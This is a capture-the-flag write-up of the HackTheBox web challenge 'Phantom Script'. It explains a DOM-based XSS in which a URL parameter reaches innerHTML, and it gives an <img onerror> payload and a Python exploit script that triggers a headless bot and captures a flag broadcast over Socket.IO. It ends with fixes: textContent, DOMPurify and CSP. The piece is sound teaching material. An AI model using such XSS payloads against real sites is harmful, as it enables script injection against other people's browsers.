---
title: "Phantom Script"
date: 2026-11-14 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, dom-xss, socket-io, engine-io, headless-bot, cwe-79]
description: "A Very Easy Web challenge: a search box drops your text straight into innerHTML, a headless puppeteer bot opens your link, and when your payload pops an alert the server broadcasts the flag over Socket.IO. innerHTML won't run <script>, so an <img onerror> does the work — and a hand-rolled Engine.IO v4 poller catches the flag with nothing but requests."
---

## Overview

`Phantom Script` is a Very Easy HackTheBox **Web** challenge built around [DOM-based Cross-Site Scripting](https://cwe.mitre.org/data/definitions/79.html). A "Haunted Scrolls" search page copies the `?q=` URL parameter directly into the page's `innerHTML`, a headless Chrome bot visits whatever URL you submit, and if your input makes an `alert()` dialog appear the server **broadcasts the flag over a Socket.IO event** to every connected client. The whole solve is: craft an `innerHTML`-safe XSS payload, trigger the bot, and listen on the socket.

## The technique

The vulnerable sink lives entirely in client-side JavaScript (`static/js/main.js`). On page load it reads the `q` parameter and renders it without any encoding:

```js
const queryParam = new URLSearchParams(window.location.search).get("q");
searchInput.value = queryParam;
applySearch(queryParam);
// inside applySearch():
searchResultsHeading.innerHTML = `Results for: "${query}"`;   // the sink
```

That is textbook DOM XSS — attacker-controlled `location.search` flows into `innerHTML` with no sanitization.

The catch that trips people up: HTML inserted via `innerHTML` does **not** execute an injected `<script>` tag — the HTML5 parser inserts it inert. So instead of `<script>`, we use a tag whose event handler fires the moment it is parsed:

```
<img src=x onerror=alert(1)>
```

`src=x` is an invalid image, the browser raises the `error` event, and `onerror` runs our `alert()`.

How does that become a flag? The backend (`helpers/botHelper.js`) runs a headless puppeteer bot:

```js
await page.goto(`http://127.0.0.1:1337?q=${query}`);   // bot visits your payload
page.on('dialog', async (dialog) => {                  // an alert() appeared
  await dialog.accept();
  io.emit('flag', { flag });                            // broadcast to ALL clients
});
```

`POST /search` triggers the bot. The flag is delivered over a Socket.IO `flag` event that is **broadcast to every connected client** (no IP or room keying) — so any socket listening at trigger time receives it.

## Solution

One practical wrinkle: the challenge runs a `socket.io` v4 server (Engine.IO **v4** required), while a stock Kali `python-socketio` only speaks Engine.IO v3 and `400`s the handshake — and with no internet to upgrade pip, we hand-roll the Engine.IO v4 long-polling handshake using nothing but `requests`.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, json, time, threading, urllib.parse, requests

target = sys.argv[1] if len(sys.argv) > 1 else "http://TARGET:PORT"
base = target + "/socket.io/"
RS = "\x1e"  # Engine.IO v4 payload record separator

payload = "<img src=x onerror=alert(1)>"      # innerHTML runs <img onerror>, not <script>
query = urllib.parse.quote(payload)            # survives http://127.0.0.1:1337?q=<query>

s = requests.Session()
P = {"EIO": "4", "transport": "polling"}

# 1) Engine.IO open handshake -> sid (leading "0{...}" packet)
r = s.get(base, params=P, timeout=15)
sid = json.loads(r.text[1:].split(RS)[0])["sid"]
P["sid"] = sid

# 2) Socket.IO CONNECT to the default namespace
s.post(base, params=P, data="40", timeout=15)

flag_box, got = {}, threading.Event()

def poll_loop():
    while not got.is_set():
        try:
            rr = s.get(base, params=P, timeout=30)
        except requests.exceptions.RequestException:
            continue
        for pkt in rr.text.split(RS):
            if not pkt:
                continue
            if pkt[0] == "2":                       # engine.io ping -> pong
                s.post(base, params=P, data="3", timeout=15)
            elif pkt.startswith("42"):              # socket.io event
                name, data = json.loads(pkt[2:])
                if name == "flag":
                    flag_box["flag"] = data.get("flag")
                    got.set()
                    return

threading.Thread(target=poll_loop, daemon=True).start()
time.sleep(0.3)

# 3) Trigger the headless bot
s.post(f"{target}/search", json={"query": query}, timeout=15)

if got.wait(timeout=20):
    print("[FLAG]", flag_box["flag"])
else:
    print("[-] no flag event within timeout")
```

Run it against your instance:

```bash
python3 solve.py http://TARGET:PORT
```

The `flag` event arrives within about a second and the flag prints — `HTB{...}` (redacted; re-derive yours by running the script against your own instance).

### Engine.IO / Socket.IO framing cheat-sheet
- `0{...}` — engine.io OPEN packet (carries the `sid`)
- `40` — socket.io CONNECT (default namespace) · `42[evt,data]` — an event
- `2` — ping (reply `3` = pong) · multiple packets in one poll are joined by `\x1e` (char 30)

## Why it worked

Untrusted input (`location.search`) flowed into the `innerHTML` sink with no output encoding — a [DOM-based XSS](https://cwe.mitre.org/data/definitions/79.html). The `<img onerror>` vector sidestepped the "`innerHTML` won't run `<script>`" rule, and because the server broadcast the flag to all sockets rather than keying it to a specific client, a single passive listener was enough to capture it.

## Fix / defense

- Never assign untrusted input to `innerHTML`. Use `textContent` for plain text, or sanitize with a library like **DOMPurify** before assigning HTML.
- Apply context-aware output encoding — HTML-encode `< > " ' &` for the HTML context.
- Defense in depth: a Content-Security-Policy that forbids inline event handlers (`script-src 'self'`, no `unsafe-inline`) would prevent `onerror=` from executing.
